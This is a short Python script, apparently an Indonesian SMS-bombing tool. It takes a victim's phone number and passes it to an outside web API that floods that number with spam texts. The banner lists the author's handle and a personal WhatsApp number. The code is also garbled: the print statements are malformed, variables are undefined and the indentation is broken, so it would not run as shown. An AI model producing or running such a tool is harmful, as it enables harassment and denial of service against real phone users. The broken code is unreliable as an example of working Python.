import requests
import time


# Logo

print                33[36;1m;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
print               ;       S P A M  S M S %      ;33[31;1m
print                ;---------------------------;33[32;1m
print                33[0;32m;       Author : H4cVil     ;
print                ;---------------------------;33[32;1m
print                ;       WA : 082393056023    ;
print                33[36;1m;---------------------------;
print                ;       github : H4ckVil     ;33[32;1m
print ('               33[32;1m;;;;;;;;;;;;;;;;;;;;;;;;;;;;;')
print ('\n[×] Nomor Di Awali dengan 8++')

# run nomor
nomor = input('[×] Normor Target : ')
req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
if 'Terkirim' in req:
    print ('[√] SpamSmS Berhasil [√] ')
else:
		print(f"{x+1}. Spam Gagal {num}")

			time.sleep(1)
		print()
